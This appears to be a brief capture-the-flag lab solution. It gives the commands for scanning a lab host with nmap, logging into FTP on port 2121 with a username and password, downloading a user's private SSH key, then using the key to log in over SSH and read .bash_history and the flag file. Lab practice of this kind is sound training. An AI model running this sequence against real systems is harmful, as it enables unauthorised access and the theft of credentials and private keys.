**Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.
```
sudo nmap --min-rate 500 --max-rtt-timeout 300ms -A 10.129.201.216
ftp 10.129.201.216 2121
ceil
qwer1234
la -la
cd .ssh
get id_rsa
exit
```

```
chmod 600 id_rsa
ssh ceil@10.129.201.216 -i id_rsa
cat .bash_history
cat /home/flag/flag.txt
```
